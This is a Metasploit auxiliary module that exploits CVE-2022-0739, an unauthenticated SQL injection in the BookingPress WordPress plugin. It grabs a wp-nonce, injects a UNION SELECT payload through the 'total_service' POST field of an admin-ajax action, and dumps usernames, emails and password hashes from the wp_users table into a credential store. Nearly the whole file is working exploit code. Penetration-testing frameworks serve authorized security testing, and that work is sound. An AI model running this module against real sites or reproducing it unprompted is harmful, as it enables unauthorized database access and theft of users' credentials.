##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::SQLi
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Wordpress BookingPress bookingpress_front_get_category_services SQLi',
        'Description' => %q{
          The BookingPress WordPress plugin before 1.0.11 fails to properly sanitize user supplied POST data before it is used in
          a dynamically constructed SQL query via the bookingpress_front_get_category_services AJAX action (available to
          unauthenticated users), leading to an unauthenticated SQL Injection.
        },
        'Author' => [
          'cyllective', # discovery
          'jheysel-r7' # module
        ],
        'References' => [
          [ 'URL', 'https://github.com/destr4ct/CVE-2022-0739'],
          [ 'WPVDB', '388cd42d-b61a-42a4-8604-99b812db2357'],
          [ 'CVE', '2022-0739']
        ],
        'License' => MSF_LICENSE,
        'DisclosureDate' => '2022-02-28',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options([
      OptString.new('TARGETURI', [ true, 'The webpage that bookingPress is running on', '/bookingpress/' ])
    ])
  end

  def check
    @nonce = get_user_nonce
    return Exploit::CheckCode::Unknown if @nonce == 'Unable to get wp-nonce for an unauthenticated user'

    @sqli = get_sqli_object

    return Exploit::CheckCode::Vulnerable if @sqli.test_vulnerable

    Exploit::CheckCode::Safe
  end

  def generate_vars_post(sqli)
    {
      'action' => 'bookingpress_front_get_category_services', # vulnerable action,
      '_wpnonce' => @nonce,
      'category_id' => 1,
      'total_service' => "#{rand(100..10000)}#{sqli}"
    }
  end

  def get_sqli_object
    create_sqli(dbms: MySQLi::Common, opts: { hex_encode_strings: true }) do |payload|
      res = send_request_cgi({
        'method' => 'POST',
        'uri' => normalize_uri('/wp-admin/admin-ajax.php'),
        'vars_post' =>
            generate_vars_post(") UNION ALL SELECT (#{payload}),456,789,12,34,56,78,90,77 from wp_users-- -")
      })
      res.get_json_document[0]['bookingpress_service_id']
    end
  end

  def get_user_nonce
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(datastore['TARGETURI'])
    })

    return 'Unable to get wp-nonce for an unauthenticated user' unless res&.body&.match("_wpnonce:'(\\w+)' };")

    ::Regexp.last_match(1)
  end

  def run
    @nonce ||= get_user_nonce
    @sqli ||= get_sqli_object
    fail_with(Failure::UnexpectedReply, 'Unable to get wp-nonce for an unauthenticated user') if @nonce == 'Unable to get wp-nonce for an unauthenticated user'

    creds_table = Rex::Text::Table.new(
      'Header' => 'Wordpress User Credentials',
      'Indent' => 1,
      'Columns' => ['Username', 'Email', 'Hash']
    )

    print_status('Extracting credential information')
    users = @sqli.dump_table_fields('wp_users', %w[user_login user_email user_pass])

    users.each do |(username, email, hash)|
      creds_table << [username, email, hash]
      create_credential({
        workspace_id: myworkspace_id,
        origin_type: :service,
        module_fullname: fullname,
        username: username,
        private_type: :nonreplayable_hash,
        jtr_format: Metasploit::Framework::Hashes.identify_hash(hash),
        private_data: hash,
        service_name: 'WordPress BookingPress Plugin',
        address: datastore['RHOSTS'],
        port: datastore['RPORT'],
        protocol: 'tcp',
        status: Metasploit::Model::Login::Status::UNTRIED,
        email: email
      })
    end
    print_line creds_table.to_s
  end
end
